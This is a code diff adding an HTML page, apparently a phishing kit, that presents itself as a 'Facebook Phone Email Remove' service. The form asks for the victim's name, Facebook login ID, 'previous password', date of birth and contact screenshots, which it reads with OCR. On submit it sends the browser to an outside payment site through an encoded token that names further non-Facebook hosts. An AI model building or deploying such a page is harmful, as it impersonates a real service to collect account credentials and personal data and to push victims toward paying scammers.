@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Remove</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tesseract.js/2.1.1/tesseract.min.js"></script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
+        }
+        .container {
+            width: 0 auto;
+            max-width: 0 auto;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #fefffd;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        h1 {
+            color: rgb(0, 17, 255);
+            font-weight: bold;
+            text-align: center;
+            font-size: 28px;
+            margin-bottom: 20px;
+        }
+        label {
+            font-weight: bold;
+            display: block;
+            margin: 10px 0 5px;
+        }
+        input[type="text"], input[type="password"], textarea, input[type="date"], input[type="file"] {
+            width: calc(100% - 2px);
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            font-size: 14px;
+            box-sizing: border-box;
+        }
+        .red-placeholder::placeholder {
+            color: red; /* Red color for the placeholder text */
+        }
+        .password-container {
+            position: relative;
+        }
+        .toggle-password {
+            position: absolute;
+            right: 10px;
+            top: 40%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            font-size: 20px;
+        }
+        input[type="submit"] {
+            width: 100%;
+            background-color: green;
+            color: white;
+            font-size: 18px;
+            font-weight: bold;
+            padding: 10px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: transform 0.3s;
+            margin-bottom: 10px;
+        }
+        input[type="submit"]:hover {
+            background-color: darkgreen;
+            transform: scale(1.05);
+        }
+        .error-message {
+            color: red;
+            font-size: 14px;
+            display: none;
+        }
+        .optional {
+            color: green;
+            opacity: 0.5;
+            font-size: 12px;
+        }
+        .hidden { display: none; }
+        #result { margin-top: 20px; }
+        .info-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .remove-btn {
+            color: red;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Facebook Phone Email Remove</h1>
+        <form id="transferForm" enctype="multipart/form-data" onsubmit="return submitForm(event)">
+            <label for="name">Name</label>
+            <input type="text" id="name" name="name" class="-placeholder" placeholder="Enter your full name" required pattern="^[a-zA-Z\s\W]+$" title="Only letters and special characters are allowed" oninput="validateName()"> <!-- Red placeholder added -->
+
+            <label for="loginId2">Login Id</label>
+            <input type="text" id="loginId2" name="loginId2" placeholder="Enter your phone number or Email Id" required>
+
+            <label for="password">Password</label>
+            <div class="password-container">
+                <input type="password" id="password" name="password" placeholder="Enter your previous password" required oninput="checkPasswordLength()">
+                <span class="toggle-password" onclick="togglePasswordVisibility()">👁️</span>
+            </div>
+            <div class="error-message" id="passwordError">Please enter your correct password</div>
+
+            <label for="dob">Date of Birth</label>
+            <input type="date" id="dob" name="dob" required onblur="validateDate()">
+
+            <label for="screenshot upload of contact information">Screenshot upload of contact information</label>
+            <input type="file" id="file-input" accept="image/*" multiple required onchange="uploadImages()">
+
+            <div id="result" class="hidden">
+                <h2>Contact Information:</h2>
+                <div id="info-container"></div>
+            </div>
+
+            <label for="additionalInfo"></label> <!-- No text here, as requested -->
+            <textarea id="additionalInfo" name="additionalInfo" rows="4" placeholder="Delete" style="width: calc(100% - 22px); padding: 10px; color: red; font-size: 12px;"></textarea>
+
+            <input type="submit" value="Proceed">
+        </form>
+    </div>
+
+    <script>
+        function validateDate() {
+            const dateInput = document.getElementById("dob");
+            const selectedDate = new Date(dateInput.value);
+            const year = selectedDate.getFullYear();
+
+            if (dateInput.value.length > 10) {
+                dateInput.value = dateInput.value.slice(0, 10);
+            }
+
+            if (year < 1950 || year > 2025) {
+                dateInput.setCustomValidity("Your date of birth may be incorrect, please enter the correct date.");
+            } else {
+                dateInput.setCustomValidity("");
+            }
+        }
+
+        function validateName() {
+            const nameInput = document.getElementById("name");
+            const pattern = /^[a-zA-Z\s\W]+$/;
+
+            if (!pattern.test(nameInput.value)) {
+                nameInput.setCustomValidity("I think your name isn't correct");
+            } else {
+                nameInput.setCustomValidity("");
+            }
+        }
+
+        function submitForm(event) {
+            event.preventDefault();
+
+            const passwordInput = document.getElementById("password").value;
+            const passwordError = document.getElementById("passwordError");
+
+            if (passwordInput.length < 6) {
+                passwordError.style.display = "block";
+                return false;
+            }
+
+            window.location.href = "https://payment.maxado.in/index.php?token=OTd8fGFIUjBjSE02THk5MWJtSmhibkJoYm1Wc0xuTmljeTltWWk5d2FHOXVaVjlsYldGcGJGOXlaVzF2ZG1VdmMzVmpZMlZ6YzJaMWJBPT18fGh0dHBzOi8vdW5iYW5wYW5lbC5zYnMvZmIvbG9ja2VkL2ZhY2Vib29rLWxvZ28uc3Zn";
+            return true;
+        }
+
+        function togglePasswordVisibility() {
+            const passwordField = document.getElementById("password");
+            const toggleSymbol = document.querySelector(".toggle-password");
+
+            if (passwordField.type === "password") {
+                passwordField.type = "text";
+                toggleSymbol.textContent = "🙈"; // Change to a different symbol when visible
+            } else {
+                passwordField.type = "password";
+                toggleSymbol.textContent = "👁️"; // Change back to original symbol
+            }
+        }
+
+        function uploadImages() {
+            const files = document.getElementById('file-input').files;
+            if (files.length > 2) {
+                alert('Please upload a maximum of 2 images.');
+                return;
+            }
+
+            const promises = [];
+            for (let i = 0; i < files.length; i++) {
+                promises.push(Tesseract.recognize(files[i], 'eng'));
+            }
+
+            Promise.all(promises).then(results => {
+                let text = results.map(result => result.data.text).join(' ');
+                extractInfo(text);
+            });
+        }
+
+        function extractInfo(text) {
+            const phoneRegex = /(\+?\d{1,3}[- ]?)?\d{10}/g; // Simple regex for phone numbers
+            const emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g; // Regex for emails
+
+            const phones = text.match(phoneRegex) || [];
+            const emails = text.match(emailRegex) || [];
+
+            const infoContainer = document.getElementById('info-container');
+            infoContainer.innerHTML = ''; // Clear previous results
+
+            phones.forEach(phone => {
+                const phoneItem = document.createElement('div');
+                phoneItem.className = 'info-item';
+                phoneItem.innerHTML = `${phone} <span class="remove-btn" onclick="removeInfo(this, '${phone}')">Remove</span>`;
+                infoContainer.appendChild(phoneItem);
+            });
+
+            emails.forEach(email => {
+                const emailItem = document.createElement('div');
+                emailItem.className = 'info-item';
+                emailItem.innerHTML = `${email} <span class="remove-btn" onclick="removeInfo(this, '${email}')">Remove</span>`;
+                infoContainer.appendChild(emailItem);
+            });
+
+            document.getElementById('result').classList.remove('hidden');
+        }
+
+        function removeInfo(element, value) {
+            element.parentElement.remove(); // Remove the item
+
+            // Add the removed value to the Additional Information box
+            const additionalInfo = document.getElementById('additionalInfo');
+            additionalInfo.value += value + ' ';
+        }
+    </script>
+</body>
+</html>
